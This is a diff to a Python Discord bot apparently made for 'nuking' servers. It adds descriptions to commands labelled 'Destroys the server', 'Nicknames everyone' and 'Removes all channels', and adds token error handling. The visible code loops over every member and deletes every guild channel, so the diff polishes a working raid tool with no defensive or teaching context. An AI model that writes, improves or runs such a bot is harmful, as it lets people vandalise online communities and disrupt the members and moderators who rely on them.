@@ -19,7 +19,7 @@ async def on_ready():
   print(f'Logged in as {bot.user}')
   print("/nuke - Destroys the server\n/nicknuke - Nicks everyone a nickname of your choosing\n/removeall - Deletes every channel")
 
-@bot.slash_command(name="nuke")
+@bot.slash_command(name="nuke", description='Nukes the server')
 async def nuke(ctx):
   for member in ctx.guild.members:
     print(member)
@@ -53,7 +53,7 @@ async def nuke(ctx):
         print("Failed send")
         
 
-@bot.slash_command(name="nicknuke")
+@bot.slash_command(name="nicknuke", description='Nicknames everyone on the server')
 async def nicknuke(ctx):
   for member in ctx.guild.members:
     print(member)
@@ -63,9 +63,11 @@ async def nicknuke(ctx):
       print("Failed nickname")
 
 
-@bot.slash_command(name="removeall")
+@bot.slash_command(name="removeall", description='Removes all channels')
 async def remove(ctx):
   for channel in ctx.guild.channels:
     await channel.delete()
-
-bot.run(TOKEN)
+try:
+  bot.run(TOKEN)
+except:
+  print("Invalid token. Please replace TOKEN='YOUR_TOKEN_HERE' with your bots token.")
